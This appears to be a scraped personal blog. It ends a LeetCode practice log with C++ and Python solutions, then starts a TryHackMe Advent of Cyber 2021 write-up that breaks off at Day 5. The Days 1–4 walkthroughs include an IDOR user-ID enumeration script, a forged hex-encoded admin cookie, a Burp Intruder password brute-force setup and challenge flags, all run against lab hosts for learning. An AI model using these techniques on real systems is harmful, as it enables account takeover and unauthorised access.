sortedSquares(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  int left = 0, right = nums.size() - 1;  vector\u0026lt;int\u0026gt; answer(nums.size(), 0);   for (int i = nums.size() - 1; i \u0026gt;= 0; --i) {  if (abs(nums[left]) \u0026lt; abs(nums[right])) {  answer.at(i) = nums[right] * nums[right];  right -= 1;  }  else {  answer[i] = nums[left] * nums[left];  left += 1;  }  }   return answer;  } }; And another one, far more superior:\nclass Solution { public:  vector\u0026lt;int\u0026gt; sortedSquares(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  transform(nums.begin(), nums.end(), nums.begin(), [](int f){return f*f;});  sort(nums.begin(), nums.end());  return nums;  } }; At this rate, I\u0026rsquo;ve eventually given up haphazardly trust big O notation. ;-;\nDay 2: 189. Rotate Array  Accepted Python solution:\nclass Solution:  def rotate(self, nums: List[int], k: int) -\u0026gt; None:  \u0026#34;\u0026#34;\u0026#34; Do not return anything, modify nums in-place instead. \u0026#34;\u0026#34;\u0026#34;  nums[:] = nums[-k % len(nums):] + nums[:-k % len(nums)] Accepted C++ solution:\nclass Solution { public:  void rotate(vector\u0026lt;int\u0026gt;\u0026amp; nums, int k) {  // reverse method  k %= nums.size();   reverse(nums.begin(), nums.end());  reverse(nums.begin(), nums.begin() + k);  reverse(nums.begin() + k, nums.end());  } }; It was the moment writing this article that I realized - I was supposed to use 2 pointers method! Guess let\u0026rsquo;s just save that for later then. :D\nDay 3: 283. Move Zeroes  Here are 2 different solutions, written in Python:\nclass Solution:  def moveZeroes(self, nums: List[int]) -\u0026gt; None:  \u0026#34;\u0026#34;\u0026#34; Do not return anything, modify nums in-place instead. \u0026#34;\u0026#34;\u0026#34;  lastNonZeroIndex: int = 0   for i in nums:  if i:  nums[lastNonZeroIndex] = i  lastNonZeroIndex += 1   for i in range(lastNonZeroIndex, len(nums)):  nums[i] = 0 class Solution:  def moveZeroes(self, nums: List[int]) -\u0026gt; None:  \u0026#34;\u0026#34;\u0026#34; Do not return anything, modify nums in-place instead. \u0026#34;\u0026#34;\u0026#34;  lastNonZeroIndex: int = 0   for i in range(len(nums)):  if nums[i]:  nums[lastNonZeroIndex], nums[i] = nums[i], nums[lastNonZeroIndex]  lastNonZeroIndex += 1 They are both O(n) in terms of time complexity, and O(1) in space complexity, so there\u0026rsquo;s not much comparison though.\nC++ implementation for the second solution:\nclass Solution { public:  void moveZeroes(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  int lastNonZeroIndex = 0;   for (int i = 0; i \u0026lt; nums.size(); ++i) {  if (nums[i])  swap(nums[lastNonZeroIndex++], nums[i]);  }  } }; Day 3: 167. Two Sum II - Input Array is Sorted  This bruteforce solution got Time Limit Exceeded:\nclass Solution { public:  vector\u0026lt;int\u0026gt; twoSum(vector\u0026lt;int\u0026gt;\u0026amp; numbers, int target) {  vector\u0026lt;int\u0026gt; ans;   for (int i = 0; i + 1 \u0026lt; numbers.size(); ++i) {  int left = i, right = numbers.size() - 1;  while (left \u0026lt; right \u0026amp;\u0026amp;\\  numbers.at(left) + numbers.at(right) \u0026gt;= target) {  if (numbers.at(left) + numbers.at(right) == target) {  ans.insert(ans.end(), {left + 1, right + 1});  return ans;  }  --right;  }  }   return ans;  } }; Accepted C++ solution:\nclass Solution { public:  vector\u0026lt;int\u0026gt; twoSum(vector\u0026lt;int\u0026gt;\u0026amp; numbers, int target) {  int left = 0, right = numbers.size() - 1;  vector\u0026lt;int\u0026gt; ans;   while (left \u0026lt; right) {  int currentSum = numbers.at(left) + numbers.at(right);   if (currentSum == target) {  ans.insert(ans.end(), {left + 1, right + 1});  break;  }  else if (currentSum \u0026gt; target) {  --right;  }  else {  ++left;  }  }   return ans;  } }; Python line-to-line convertion of that exact piece of code:\nclass Solution:  def twoSum(self, numbers: List[int], target: int) -\u0026gt; List[int]:  left, right = 0, len(numbers) - 1  answer: List[int] = []   while left \u0026lt; right:  currentSum: int = numbers[left] + numbers[right]   if currentSum == target:  answer.extend([left + 1, right + 1])  break  elif currentSum \u0026gt; target:  right -= 1  else:  left += 1   return answer Day 4: 344. Reverse String  Nothing much, just swap them in-place, and there\u0026rsquo;re built-in functions for that. Here\u0026rsquo;s C++ solution:\nclass Solution { public:  void reverseString(vector\u0026lt;char\u0026gt;\u0026amp; s) {  reverse(s.begin(), s.end());  } }; And Python implementation:\nclass Solution:  def reverseString(self, s: List[str]) -\u0026gt; None:  \u0026#34;\u0026#34;\u0026#34; Do not return anything, modify s in-place instead. \u0026#34;\u0026#34;\u0026#34;  s.reverse() Day 4: 557. Reverse Words in a String III  Still nothing much. Let\u0026rsquo;s just split it out and reverse it.\nC++ accepted solution:\nclass Solution { public:  string reverseWords(string s) {  int lastChar = 0;  string answer = s + \u0026#34; \u0026#34;;  for (int wordcount = 0; wordcount \u0026lt; answer.size(); ++wordcount) {  if (answer[wordcount] == \u0026#39; \u0026#39;) {  int left = lastChar, right = wordcount;  lastChar = wordcount + 1;  reverse(answer.begin() + left, answer.begin() + right);  }  }  answer.pop_back();  return answer;  } }; Accepted Python solution:\nclass Solution:  def reverseWords(self, s: str) -\u0026gt; str:  return \u0026#34; \u0026#34;.join([word[::-1] for word in s.split()]) Day 5: 876. Middle of the Linked List  Solution: Get 2 pointers to iterate at different speed, the faster one is twice as fast as the slower one. When the faster pointer reach the end, the slower pointer should be in the middle.\nAccepted C++ implementation:\n/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */ class Solution { public:  ListNode* middleNode(ListNode* head) {  ListNode *slow = head, *fast = head;   while (fast != NULL \u0026amp;\u0026amp; fast -\u0026gt; next != NULL) {  slow = slow -\u0026gt; next;  fast = fast -\u0026gt; next -\u0026gt; next;  }   return slow;  } }; For Python, I tried to store all nodes in a list and then pick the middle out. Unexptectedly, 2 algorithms run at exactly same speed (28ms) and memory (14.1 MB):\n# Should be slower, but wasn\u0026#39;t.  # Definition for singly-linked list. # class ListNode: # def __init__(self, val=0, next=None): # self.val = val # self.next = next class Solution:  def middleNode(self, head: Optional[ListNode]) -\u0026gt; Optional[ListNode]:  allList: List[ListNode] = []  currentNode = head   while True:  allList.append(currentNode)  if not currentNode.next: break  currentNode = currentNode.next   return allList[len(allList) // 2] class Solution:  def middleNode(self, head: Optional[ListNode]) -\u0026gt; Optional[ListNode]:  slow: ListNode = head  fast: ListNode = head   while fast != None and fast.next != None:  slow = slow.next  fast = fast.next.next   return slow Day 5: 19. Remove Nth Node From End of List  Again, the solution is to have 2 pointers run with the distance n. When get to the node need to be deleted, simply link the previous node to the next node.\nC++ implementation (faster than 100% and run at 0ms. lmao proud :D):\n/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */ class Solution { public:  ListNode* removeNthFromEnd(ListNode* head, int n) {  if (n == 0) return head;   ListNode *fast = head, *slow = head;  int fastIndex = 0, slowIndex = 0;   while (fast -\u0026gt; next != NULL) {  fast = fast -\u0026gt; next;  ++fastIndex;   if (fastIndex - slowIndex \u0026gt; n) {  slow = slow -\u0026gt; next;  ++slowIndex;  }  }   // For edge case  int linkedListSize = fastIndex + 1;  if (linkedListSize == n) return head -\u0026gt; next;   // Deleting by wiring previous to after deleting element  slow -\u0026gt; next = slow -\u0026gt; next -\u0026gt; next;   return head;  } }; Python implementation:\n# Definition for singly-linked list. # class ListNode: # def __init__(self, val=0, next=None): # self.val = val # self.next = next class Solution:  def removeNthFromEnd(self, head: Optional[ListNode], n: int) -\u0026gt; Optional[ListNode]:  if n == 0: return head   fast: ListNode = head  slow: ListNode = head  fastIndex = slowIndex = 0   while fast.next != None:  fast = fast.next  fastIndex += 1  if fastIndex - slowIndex \u0026gt; n:  slow = slow.next  slowIndex += 1   linkedListSize: int = fastIndex + 1  if n == linkedListSize:  return head.next   # Deleting  slow.next = slow.next.next   return head Day 6: 3. Longest Substring Without Repeating Character  The general idea is: Store the last position that does not contain a certain character, for every character in the string. When meet the next occurence of that character, we can immediately know length of the longest substring up to that point.\nC++ implementation:\nclass Solution { public:  int lengthOfLongestSubstring(string s) {  int maxcount = 0;  unordered_map\u0026lt;char, int\u0026gt; index;   for (int left = 0, right = 0; right \u0026lt; s.size(); ++right) {  if (index.find(s[right]) != index.end()) {  left = max(left, index[s[right]]);  }  maxcount = max(maxcount, right - left + 1);  index[s[right]] = right + 1;  }   return maxcount;  } }; Python implementation:\nclass Solution:  def lengthOfLongestSubstring(self, s: str) -\u0026gt; int:  maxcount: int = 0  indexes: dict = {}   i = 0  for j in range(len(s)):  if s[j] in indexes:  i = max(i, indexes[s[j]])   maxcount = max(maxcount, j - i + 1)  indexes[s[j]] = j + 1   return maxcount Day 6: 567. Permutation in String  Just count. Since a permutation can never be longer than s1, let\u0026rsquo;s just iterate through s2 with a sliding window of length s1 and check if it\u0026rsquo;s a permutation by counting number of occurence of every characters.\nC++ implementation:\nclass Solution { public:  bool checkInclusion(string s1, string s2) {  if (s1.size() \u0026gt; s2.size())  return false;   array\u0026lt;int, 26\u0026gt; s1map = {}; // all elements will be init to 0  for (auto c : s1)  ++s1map.at((int)(c - \u0026#39;a\u0026#39;));   for (int start = 0; start \u0026lt; s2.size() - s1.size() + 1; ++start) {  array\u0026lt;int, 26\u0026gt; s2map = {};  for (int i = start; i \u0026lt; start + s1.size(); ++i)  ++s2map.at((int)(s2[i] - \u0026#39;a\u0026#39;));   if (s1map == s2map)  return true;  }   return false;  } }; Python implementation:\nclass Solution:  def checkInclusion(self, s1: str, s2: str) -\u0026gt; bool:  if len(s1) \u0026gt; len(s2):  return False   s1map = [0] * 26  for char in s1:  s1map[ord(char) - ord(\u0026#39;a\u0026#39;)] += 1   # Sliding window  for start in range(len(s2) - len(s1) + 1):  s2map = [0] * 26   for char in range(start, start + len(s1)):  s2map[ord(s2[char]) - ord(\u0026#39;a\u0026#39;)] += 1   if s1map == s2map:  return True   return False Daily coding problems December 2nd: 328. Odd Even Linked List  Accepted Python solution:\n# Definition for singly-linked list. # class ListNode: # def __init__(self, val=0, next=None): # self.val = val # self.next = next class Solution:  def move2Nodes(self, node: ListNode) -\u0026gt; ListNode:  node.next = node.next.next  return node.next   def oddEvenList(self, head: Optional[ListNode]) -\u0026gt; Optional[ListNode]:  if head == None:  return head   oddNode: ListNode = head  evenNode: ListNode = head.next   firstEvenElement: ListNode = evenNode   while evenNode != None and evenNode.next != None:  oddNode = self.move2Nodes(oddNode)  evenNode = self.move2Nodes(evenNode)   oddNode.next = firstEvenElement   return head Accepted C++ solution:\n/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */ class Solution { public:  void movePointer2Nodes(ListNode*\u0026amp; pointer) {  pointer -\u0026gt; next = pointer -\u0026gt; next -\u0026gt; next;  pointer = pointer -\u0026gt; next;  }   ListNode* oddEvenList(ListNode* head) {  if (head == NULL) {  return head;  }   ListNode *oddPointer = head, *evenPointer = head -\u0026gt; next;  ListNode *firstEvenElement = evenPointer;   // Intuition: Use 2 pointers,  // iterate them by 2 nodes in turn,  // then link the last element of odd to  // the first element of even   while (evenPointer != NULL \u0026amp;\u0026amp; evenPointer -\u0026gt; next != NULL) {  movePointer2Nodes(oddPointer);  movePointer2Nodes(evenPointer);  }   oddPointer -\u0026gt; next = firstEvenElement;   return head;  } }; However, this one got Runtime Error:\n/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */ class Solution { public:  void movePointer2Nodes(ListNode*\u0026amp; pointer) {  pointer -\u0026gt; next = pointer -\u0026gt; next -\u0026gt; next;  pointer = pointer -\u0026gt; next;  }   ListNode* oddEvenList(ListNode* head) {  ListNode *oddPointer = head, *evenPointer = head -\u0026gt; next;  ListNode *firstEvenElement = evenPointer;   // Intuition: Use 2 pointers,  // iterate them by 2 nodes in turn,  // then link the last element of odd to  // the first element of even   while (evenPointer != NULL \u0026amp;\u0026amp; evenPointer -\u0026gt; next != NULL) {  movePointer2Nodes(oddPointer);  movePointer2Nodes(evenPointer);  }   oddPointer -\u0026gt; next = firstEvenElement;   return head;  } }; without comparing it with the above accepted code, can you figure out where\u0026rsquo;s the flaw? :D\nDecember 7th: 1290. Convert Binary Number in a Linked List to Interger  Nothing much to discuss here. Let\u0026rsquo;s do some elementary math.\nAt first I thought bitwise operators must be faster than doing normal operations, so I tried this:\n/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */ class Solution { public:  int getDecimalValue(ListNode* head) {  int decimal = 0;  ListNode* node = head;   while (node != NULL) {  decimal = (decimal \u0026lt;\u0026lt; 1) | node -\u0026gt; val;  node = node -\u0026gt; next;  }   return decimal;  } }; And it ran at 7ms. Not that bad. However, when I change this line:\ndecimal = (decimal \u0026lt;\u0026lt; 1) | node -\u0026gt; val; Which are bitwise operators, to normal operators:\ndecimal = decimal * 2 + node -\u0026gt; val; It ran at 4ms - slightly faster. Why?\nBy the way, here\u0026rsquo;s the Python implementation (faster than 97.4%, and please don\u0026rsquo;t care about space complexity lol):\n# Definition for singly-linked list. # class ListNode: # def __init__(self, val=0, next=None): # self.val = val # self.next = next class Solution:  def getDecimalValue(self, head: ListNode) -\u0026gt; int:  digits: List[str] = []  node = head  while node != None:  digits.append(str(node.val))  node = node.next   return int(\u0026#34;\u0026#34;.join(digits), 2) December 8th: 563. Binary Tree Tilt  Just basic recursive function. To find the tilt of a node, we first need to find its children sum. The same is also true for higher nodes, hence this C++ implementation:\n/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */ class Solution { public:  int nodeSum(TreeNode* node, int\u0026amp; total) {  if (node == NULL)  return 0;   int leftSum = nodeSum(node -\u0026gt; left, total);  int rightSum = nodeSum(node -\u0026gt; right, total);  total += abs(leftSum - rightSum);   return leftSum + rightSum + node -\u0026gt; val;   }   int findTilt(TreeNode* root) {  int answer = 0;   nodeSum(root, answer);  return answer;  } }; Faster than 95.64% by the way :D. And here\u0026rsquo;s Python version of that exact algorithm:\n# Definition for a binary tree node. # class TreeNode: # def __init__(self, val=0, left=None, right=None): # self.val = val # self.left = left # self.right = right class Solution:  def findTilt(self, root: Optional[TreeNode]) -\u0026gt; int:  answer: int = 0   def nodeSum(node: TreeNode):  nonlocal answer   if node == None:  return 0   leftSum: int = nodeSum(node.left)  rightSum: int = nodeSum(node.right)  tilt = abs(leftSum - rightSum)  answer += tilt   return node.val + leftSum + rightSum   nodeSum(root)  return answer December 9th: 1306. Jump Game III  What came to your mind first? Recursive check function, right?\nI\u0026rsquo;ve to admit, it\u0026rsquo;s quite slow and memory-ineffective. But hey, it\u0026rsquo;s simple to understand, and relatively short to implement. :D\nclass Solution { public:  bool canReach(vector\u0026lt;int\u0026gt;\u0026amp; arr, int start) {  if (start \u0026lt; 0 || start \u0026gt; arr.size() || arr[start] \u0026lt; 0)  return false;  if (arr[start] == 0) return true;   arr[start] *= -1; // mark iterated indexes  return canReach(arr, start + arr[start]) || canReach(arr, start - arr[start]);  } }; Here\u0026rsquo;s Python-translated version:\nclass Solution:  def canReach(self, arr: List[int], start: int) -\u0026gt; bool:  # Depth first search  if start \u0026lt; 0 or start \u0026gt;= len(arr) or arr[start] \u0026lt; 0:  return False  if arr[start] == 0:  return True   arr[start] *= -1  return self.canReach(arr, start + arr[start]) or self.canReach(arr, start - arr[start]) December 13th: 1446. Consecutive Characters  Nothing much here - just count it! :v\nHere\u0026rsquo;s 93.39% faster than others Python implementation:\nclass Solution:  def maxPower(self, s: str) -\u0026gt; int:  if len(s) \u0026lt;= 1:  return len(s)  maxPower = 0  power = 0  currentChar: chr = s[0]   for char in s:  if char == currentChar:  power += 1  maxPower = max(power, maxPower)  else:  currentChar = char  power = 1   return maxPower And 100% faster, 0ms execution time C++ implementation:\nclass Solution { public:  int maxPower(string s) {  if (s.size() == 1)  return s.size();  char currentChar = s[0];  int power = 0, maxPower = 0;   for (char c:s) {  if (c == currentChar)  maxPower = max(maxPower, ++power);  else {  currentChar = c;  power = 1;  }  }   return maxPower;  } }; December 14th: 938. Range Sum of BST  Another nothing-much-to-say problem. Let\u0026rsquo;s just traverse the tree and do exactly as the problem required.\nHere\u0026rsquo;s the Python implementation:\nclass Solution:  def rangeSumBST(self, root: Optional[TreeNode], low: int, high: int) -\u0026gt; int:  if root == None: return 0  if low \u0026lt;= root.val and root.val \u0026lt;= high:  return root.val + self.rangeSumBST(root.left, low, high) + self.rangeSumBST(root.right, low, high)  return self.rangeSumBST(root.left, low, high) + self.rangeSumBST(root.right, low, high) And the C++ implementation:\nclass Solution { public:  int rangeSumBST(TreeNode* root, int low, int high) {  if (root == NULL) return 0;  if (low \u0026lt;= root -\u0026gt; val \u0026amp;\u0026amp; root -\u0026gt; val \u0026lt;= high)  return root -\u0026gt; val + rangeSumBST(root -\u0026gt; left, low, high) + rangeSumBST(root -\u0026gt; right, low, high);  return rangeSumBST(root -\u0026gt; left, low, high) + rangeSumBST(root -\u0026gt; right, low, high);  } }; Try to guess the performance of them both? :D\nTo my surprise, here\u0026rsquo;s a comparison of that exact algorithm in 2 languages: See the difference? C++ ran twice as fast, with 3 times as much memory usage. An unexpected trade-off. Guess the Python\u0026rsquo;s garbage collector\u0026rsquo;s shown off its mightiness after all. :D\n","permalink":"https://git-akihakune.github.io/blog/myleetcodejourney/","summary":"My Leetcode journey from scratch","title":"My Leetcode journey"},{"content":" Part 1 of 2021 Advent of Cyber Part 2 of 2021 Advent of Cyber   Before reading this article, I strongly suggest you take your time and try the challenges out yourself, it will definitely worth your time!\nSince Try Hack Me has done an awesome job in explaining things plain and simple, I won\u0026rsquo;t repeat again their tutorial. Instead, I\u0026rsquo;ll try to summarize it in the most concise (but understandable) way I can.\n[Day 1] Web Exploitation: Save The Gifts  So, today\u0026rsquo;s learning objective seems to be IDOR vulnerability, which stands for Insecure Direct Object Reference.\nTo keep it short, IDOR vulnerabilities occur when a developer doesn\u0026rsquo;t validate requesting data, For example:\n See that id=23 at the end? That is your user ID. If you change that to id=0, id=-1,id=null or something, and you suddenly get in another user\u0026rsquo;s account, that is IDOR vulnerability.\nBeside the GET request example above, we also have IDOR in POST request:\n\u0026lt;form method=\u0026#34;POST\u0026#34; action=\u0026#34;/update-password\u0026#34;\u0026gt;  \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;user_id\u0026#34; value=\u0026#34;123\u0026#34;\u0026gt;  \u0026lt;div\u0026gt;New Password:\u0026lt;/div\u0026gt;  \u0026lt;div\u0026gt;\u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;new_password\u0026#34;\u0026gt;\u0026lt;/div\u0026gt;  \u0026lt;div\u0026gt;\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Change Password\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026hellip; or in cookies:\nGET /user-information HTTP/1.1 Host: website.thm Cookie: user_id=9 User-Agent: Mozilla/5.0 (Ubuntu;Linux) Firefox/94.0  Hello Jon! And in reality, if you check public Hackerone bug submissions, you will find a great portion of IDOR vulnerabilities there.\nNow with all that knowledge, let\u0026rsquo;s dive into our challenge.\nUpon entering that website, we\u0026rsquo;re welcomed with a homepage like this.\n   Click on anything clickable, we found out that nothing is clickable on those pages. That left us with only the page Your Activity.\n Without any obstacle, we can instantly find a textbook vulnerability. It lies here:\n Remember, in programming languages, it usually starts from 0 rather than 1. But if we try ?user_id=0, it will scream \u0026ldquo;lol no user like that bro\u0026rdquo;.\n But if we change that to ?user_id=1:\n Guess we\u0026rsquo;re in. :D\nIn the wild, the number of possibilities to test is simply too massive to manually try it all. So the best way is to use on-the-spot scripts like this:\n#!/usr/bin/env python3 import requests  address: str = \u0026#34;https://inventory-management.thm/activity\u0026#34; startId: int = 0 testRange: int = 20  for id in range(startId, startId + testRange): \tresponse = requests.get(address, params={\u0026#34;user_id\u0026#34;: id}) \tif response.status_code == 200: \tprint(f\u0026#34;Found something at {address}?user_id={id}\u0026#34;) Just iteratively try that id out, we also find McStocker\u0026rsquo;s account at https://inventory-management.thm/activity?user_id=3.\n And another at ?user_id=9:\n And when we click on all those revert (as our instinct tell us to do so), we got the final flag.\n To conclude, our flags today are:\nAfter finding Santa's account, what is their position in the company? The Boss!\nAfter finding McStocker's account, what is their position in the company? Build Manager\nAfter finding the account responsible for tampering, what is their position in the company? Mischief Manager\nWhat is the received flag when McSkidy fixes the Inventory Management System? THM{AOC_IDOR_2B34BHI3}\n[Day 2] Web Exploitation: Elf HR Problems  So in short, today\u0026rsquo;s learning objective is fundamental knowledge about the WWW. You can skip all the text below and jump right to answers if you\u0026rsquo;ve already had experience working with the web.\nSince this is actually a vast topic, I\u0026rsquo;ll try keeping things simple by omitting the details. If you want to learn more in-depth about web technologies (which you should, because it\u0026rsquo;s like Hello World for pentesters and developers alike), I suggest the great Mozilla Docs, where they\u0026rsquo;ve explained everything with great details.\nFirst things first, HTTP.\nYou are reading this article, on the Internet, from your browser, aren\u0026rsquo;t you?\nThen I hope you\u0026rsquo;re using a computer. Press Ctr+U, or right click and View Page Source, you should see something like this: As you can see, this is the true nature of the Web - Hypertext. A bunch of codes define what a page contain, how does it look, what will it do, and so on.\nWhen people talk about HTTP, they\u0026rsquo;re talking about the way in which such Hypertext are transferred among computers - sending request, and waiting to be responded (imagine you messaging with someone). An example request:\nGET / HTTP/1.1 Host: tryhackme.com User-Agent: Mozilla/5.0 Firefox/87.0 Referer: https://tryhackme.com/ And an example respond:\nHTTP/1.1 200 OK Server: nginx/1.15.8 Date: Wednesday, 24 Nov 2021 13:34:03 GMT Content-Type: text/html Content-Length: 98  \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;  \u0026lt;title\u0026gt;Advent of Cyber\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;  Welcome To Advent of Cyber! \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; As you can see, Hypertext is also in the respond. The browser render that, then showing you the page - all happened in the matter of miliseconds.\nHTTPS is HTTP, but more secure, since it\u0026rsquo;s encrypted.\nOn the other hand, cookie is a something sent back and forth among computers, to identify who you are.\nOn your browser, press F12 to open Dev Tools, find Cookies tab, somewhere in Storage or Application. The yummy cookies should be there. And since cookies are stored locally on your computer, it can be changed however we want.\nEquipped with all that knowledge, here comes the challenge!\nGet into the challenge page, we see an ordinary login form.\n Let\u0026rsquo;s register an account!\n \u0026hellip; okay? (\u0026rsquo;-')\nChecking DevTool, we can find a cookie like this\nuser-auth:\u0026#34;7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a22746573746572227d\u0026#34; It\u0026rsquo;s not very readable. So let\u0026rsquo;s try to decode it with CyberChef.\n (If you find the image too small to read, why don\u0026rsquo;t open up another tab and decode it? :D)\nWe can see that the cookie is stored in JSON format, encoded in hexadecimal.\nChanging out username to admin (as the task told us to), then copy-pasting it to DevTool\u0026hellip;\n This is certified \u0026ldquo;I\u0026rsquo;m in\u0026rdquo; moment. :D\nFrom there, we can get all needed information to answer the questions:\nWhat is the name of the new cookie that was created for your account?\nuser-auth\nWhat encoding type was used for the cookie value?\nhexadecimal\nWhat object format is the data of the cookie stored in?\njson\nWhat is the value of the administrator cookie? (username = admin)\n7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a2261646d696e227d What team environment is not responding?\nHR\nWhat team environment has a network warning?\nApplication\n [Day 3] Web Exploitation: Christmas Blackout  Okay, long story short, content discovery and authentication bypass. Absolutely useful in real life applications.\nThere\u0026rsquo;s not much to say about this, since everything we\u0026rsquo;re gonna do is bruteforcing the credentials. One reminder, thou, is that in real life bruteforcing is nowhere near as effective as it\u0026rsquo;s in ctfs, and let\u0026rsquo;s be grateful for that. :D\n And just like that, we\u0026rsquo;ve got the location of admin panel.\nFrom here, we usually use specialised tools like Hydra. However we\u0026rsquo;ve already been given a wordlist with only 3 entries in this case, which\u0026rsquo;s saved us from the hassle of writing lengthy commands. :D\nManually test the entries, we got it at administrator:administrator.\n Another way to do that is taking a look at the JS file.\nconst loginForm = document.getElementById(\u0026#34;login-form\u0026#34;); const loginButton = document.getElementById(\u0026#34;login-form-submit\u0026#34;); const loginErrorMsg = document.getElementById(\u0026#34;login-error-msg\u0026#34;);  loginButton.addEventListener(\u0026#34;click\u0026#34;, (e) =\u0026gt; {  e.preventDefault();  const username = loginForm.username.value;  const password = loginForm.password.value;   if (username === \u0026#34;administrator\u0026#34; \u0026amp;\u0026amp; password === \u0026#34;administrator\u0026#34;) {  alert(\u0026#34;You have successfully logged in.\u0026#34;);  window.open(\u0026#39;dc7161be3dbf2250c8954e5.html\u0026#39;);  } else {  loginErrorMsg.style.opacity = 1;  } }) We can clearly see username and password written in plaintext, and even the \u0026ldquo;secret\u0026rdquo; location it\u0026rsquo;ll redirect us to. Again, in real life, no sane developer do this. However, let\u0026rsquo;s just be chill in this ctf-only \u0026ldquo;I\u0026rsquo;m in\u0026rdquo; moment and move on! xD\n Having accessed to the admin panel, now we\u0026rsquo;ve got all flags needed for the questions!\nUsing a common wordlist for discovering content, enumerate http://10.10.235.89 to find the location of the administrator dashboard. What is the name of the folder? admin\nIn your web browser, try some default credentials on the newly discovered login form for the \u0026quot;administrator\u0026quot; user. What is the password? administrator\nAccess the admin panel. What is the value of the flag? THM{ADM1N_AC3SS}\n [Day 4] Web Exploitation: Santa\u0026rsquo;s running behind  Today\u0026rsquo;s learning material is relatively short and concise. So in case you haven\u0026rsquo;t, please go to Day 4 tutorial here.\nOne small reminder, thou: Burpsuite is (in)famous for its avaricious RAM usage, so if you run it in a virtual machine, watch out for sudden halts.\nAnother thing: Burp Suite\u0026rsquo;s built in browser\u0026rsquo;s become fantastic nowadays - a separate Firefox with FoxyProxy is no longer needed.\nOne final extra note: If you, for some reason, don\u0026rsquo;t want or can\u0026rsquo;t afford the Burp Suite pro version, or just genuinely support the idea of open-source softwares, then try to take a look at ZAP. On my own, I find Burp Suite\u0026rsquo;s UI more intuitive, but ZAP\u0026rsquo;s much more powerful once you get the hang of it.\nWith all that being said, let\u0026rsquo;s jump in. :D\n We\u0026rsquo;re greeted with a basic login form like this. Neither the source code or default credentials revealed anything special.\nBased on task\u0026rsquo;s requirements, seems like all we\u0026rsquo;ve to do\u0026rsquo;s to bruteforce it. Let me show you the cool way to do it. :D\n \u0026hellip; or not\u0026hellip; Weird. :L\nLet\u0026rsquo;s burn our RAM and open up Burp Suite, then.\nHere\u0026rsquo;s the POST request we intercepted:\nPOST / HTTP/1.1  Host: 10.10.154.103  Content-Length: 45  Cache-Control: max-age=0  Upgrade-Insecure-Requests: 1  Origin: http://10.10.154.103  Content-Type: application/x-www-form-urlencoded  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  Referer: http://10.10.154.103/  Accept-Encoding: gzip, deflate  Accept-Language: en-US,en;q=0.9  Cookie: PHPSESSID=c3k9aqaa365sapdv67vh3p3bte  Connection: close    username=santa\u0026amp;password=password\u0026amp;submit=Login Let\u0026rsquo;s Ctrl+I to send it to Intruder.\nThe first Target tab, default options are fine. On the second Positions tab, make sure that you only insert payloads in password field:\nPOST / HTTP/1.1  Host: 10.10.154.103  Content-Length: 45  Cache-Control: max-age=0  Upgrade-Insecure-Requests: 1  Origin: http://10.10.154.103  Content-Type: application/x-www-form-urlencoded  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  Referer: http://10.10.154.103/  Accept-Encoding: gzip, deflate  Accept-Language: en-US,en;q=0.9  Cookie: PHPSESSID=c3k9aqaa365sapdv67vh3p3bte  Connection: close    username=santa\u0026amp;password=§password§\u0026amp;submit=Login Now continues to Payload tab. Since we\u0026rsquo;ve already had a nice small password list, let\u0026rsquo;s copy it and Paste.\n It all looks good now. Let\u0026rsquo;s press Start Attack on upper right side. Here\u0026rsquo;s the result:\n Based on the length, we can easily spot the unique one.\nHaving had all that information, let\u0026rsquo;s login to santa\u0026rsquo;s account!\n And here comes the last flag!\nSo our flags today are:\nWhat valid password can you use to access the \u0026quot;santa\u0026quot; account? cookie\nWhat is the flag in Santa's itinerary? THM{SANTA_DELIVERS}\n [Day 5] Web Exploitation: Pesky Elf Forum  Our learning objective today is, yeah, Cross-Site Scripting aka XSS vulnerability.\nAs XSS itself is an endless topic, I\u0026rsquo;ll leave the explaining part to Portswigger\u0026rsquo;s post. It has intelligible visualization of XSS concepts, so you should definitely check it 